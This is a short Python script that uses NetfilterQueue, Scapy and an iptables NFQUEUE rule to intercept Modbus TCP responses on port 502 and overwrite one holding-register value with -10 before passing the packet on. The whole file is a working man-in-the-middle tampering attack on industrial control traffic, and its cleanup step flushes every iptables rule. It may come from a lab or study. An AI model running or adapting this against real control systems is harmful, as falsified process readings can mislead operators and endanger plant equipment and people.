#/usr/bin/env python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
import scapy.contrib.modbus as mb
import os

def print_and_accept(pkt):
    print('debug packet: ' + IP(pkt.get_payload()).summary())
    pkt.accept()


def modify(packet):
    pkt = IP(packet.get_payload())
    val = 30
    newval = 0
    # print('packet: ' + pkt.summary())
    try:
        if mb.ModbusPDU03ReadHoldingRegistersResponse in pkt:
            # print('Modbus packet detected')
            # print('modbus packet : ' + pkt.show() )
            if(pkt["ModbusADUResponse"].funcCode == 0x3) and len(pkt["ModbusADUResponse"].registerVal) > 11:
                print('ORIGINAL:')
                print(pkt["ModbusADUResponse"].registerVal)
                pkt["ModbusADUResponse"].registerVal[10] = 65526 # 1111111111110110 = -10

                del pkt[IP].chksum
                del pkt[TCP].chksum
                packet.set_payload(bytes(pkt))
                print('NEW: ')
                print(pkt["ModbusADUResponse"].registerVal)
                print("---------------------------------")
    except Exception as e:
        print(e)
        pass
    packet.accept()


def main():

    iptablesr = 'iptables -t nat -A PREROUTING -p tcp --sport 502  -j NFQUEUE --queue-num 1'
    print("Adding iptable rules :")
    print(iptablesr)
    os.system(iptablesr)


    print("Waiting for paquets...")
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, modify)
    # nfqueue.bind(1, print_and_accept)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('')
        nfqueue.unbind()
        print("Flushing iptables.")
        os.system('iptables -F')
        os.system('iptables -F -t mangle')
        os.system('iptables -t nat -D PREROUTING 1')
        os.system('iptables -X')
        nfqueue.unbind()

if __name__ == '__main__':
    main()
